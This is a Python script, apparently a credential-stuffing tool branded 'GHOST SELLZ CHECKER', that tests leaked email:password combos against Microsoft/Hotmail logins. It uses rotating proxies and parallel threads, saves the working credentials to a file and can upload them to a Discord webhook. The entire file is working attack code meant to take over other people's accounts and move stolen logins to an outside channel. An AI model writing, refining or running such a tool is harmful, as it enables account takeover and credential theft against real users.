import random
import threading
import requests
from mailhub import MailHub
from colorama import init, Fore
from concurrent.futures import ThreadPoolExecutor
from tempfile import NamedTemporaryFile
import os

# Initialize Colorama for cross-platform compatibility
init(autoreset=True)

mail = MailHub()

# Lock to ensure only one thread writes to the file at a time
write_lock = threading.Lock()

def validate_line(line):
    """Validate the line format to prevent IndexError."""
    parts = line.strip().split(":")
    if len(parts) == 2:
        return parts[0], parts[1]
    else:
        return None, None

def attempt_login(email, password, proxy, hits_file, local_hits_file):
    """Attempt login with a given email, password, and proxy."""
    res = mail.loginMICROSOFT(email, password, proxy)[0]

    if res == "ok":
        print(Fore.GREEN + f"Valid   | {email}:{password}")
        with write_lock:
            hits_file.write(f"{email}:{password}\n")
            hits_file.flush()
            local_hits_file.write(f"{email}:{password}\n")
            local_hits_file.flush()
    else:
        print(Fore.RED + f"Invalid | {email}:{password}")

def process_combo_file(hits_file, local_hits_file, proxies):
    """Process the combo file and attempt logins in parallel."""
    with open("combo.txt", "r") as file:
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = []
            for line in file:
                email, password = validate_line(line)
                
                if email is None or password is None:
                    print(Fore.YELLOW + f"Invalid format in line: {line.strip()}")
                    continue

                proxy = {"http": f"http://{random.choice(proxies).strip()}"}
                futures.append(executor.submit(attempt_login, email, password, proxy, hits_file, local_hits_file))

            for future in futures:
                future.result()

def send_to_discord(file_path, webhook_url):
    """Send the file to a Discord webhook as an attachment."""
    if os.stat(file_path).st_size == 0:
        print(Fore.RED + "The file is empty. No valid hits found.")
        return

    with open(file_path, 'rb') as file:
        files = {
            'file': ('valid_hits.txt', file, 'text/plain')
        }
        payload = {
            'content': 'VALID HOTMAIL CHECKED WITH GHOST SELLZ CHECKER.\n'
        }

        try:
            response = requests.post(webhook_url, data=payload, files=files)
            if response.status_code == 204:
                print(Fore.GREEN + "Successfully sent the file to Discord!")
            else:
                print(Fore.RED + f"Failed to send the file to Discord. Status code: {response.status_code}")
                print(Fore.RED + f"Response: {response.text}")
        except Exception as e:
            print(Fore.RED + f"An error occurred while sending the file: {e}")

def main():
    while True:
        print(Fore.CYAN + "Menu:")
        print("1. Start login attempts")
        print("2. Exit")
        choice = input(Fore.CYAN + "Enter your choice: ").strip()

        if choice == "1":
            webhook_url = input(Fore.CYAN + "Enter your Discord webhook URL (leave blank to skip): ").strip()

            with open("proxy.txt", "r") as proxy_file:
                proxies = proxy_file.readlines()

            # Open the local file to save valid hits permanently
            with open("valid_hits.txt", "a", encoding="utf-8") as local_hits_file:
                with NamedTemporaryFile(delete=False, mode='w', newline='', encoding='utf-8') as temp_file:
                    print(Fore.CYAN + "Starting login attempts...")
                    process_combo_file(temp_file, local_hits_file, proxies)
                    print(Fore.CYAN + "Login attempts finished.")

                    if webhook_url:
                        send_to_discord(temp_file.name, webhook_url)
                    else:
                        print(Fore.YELLOW + "Skipping Discord notification as no webhook URL was provided.")
        elif choice == "2":
            print(Fore.CYAN + "Exiting program. Goodbye!")
            break
        else:
            print(Fore.RED + "Invalid choice. Please try again.")
            continue
        
        os.remove(temp_file.name)  # Delete the temporary file after processing
        input(Fore.CYAN + "Press any key to continue...")
        print(Fore.RESET)  # Reset the colorama terminal colors for the next iteration
        os.system('cls' if os.name == 'nt' else 'clear')  # Clear the terminal screen for the next iteration
        print()

if __name__ == "__main__":
    main()
